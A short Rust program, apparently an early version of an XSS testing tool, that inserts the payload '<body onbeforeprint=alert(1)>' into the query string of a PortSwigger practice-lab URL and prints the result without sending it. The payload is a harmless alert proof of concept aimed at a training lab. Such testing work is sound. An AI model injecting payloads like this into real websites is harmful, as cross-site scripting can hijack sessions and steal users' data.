// Created by inc0gnit0, skript0r, ElementalX, p4yl0ad
// Latest update: 6/11/20
// Version: 0.0.1

// Dependencies
use isahc; // 0.9.3
use regex::Regex; // 1.3.9

// Main
fn main() {
    let payload = "<body onbeforeprint=alert(1)>";
    let target = "https://portswigger-labs.net/xss/xss.php?x=$";
    // This regex below replaces $ with the payload
    let re = Regex::new("\\$").unwrap();
    let new_url = re.replace(target, payload);
    println!("{:?}", new_url); // This prints https://portswigger-labs.net/xss/xss.php?x=<body onbeforeprint=alert(1)>
}
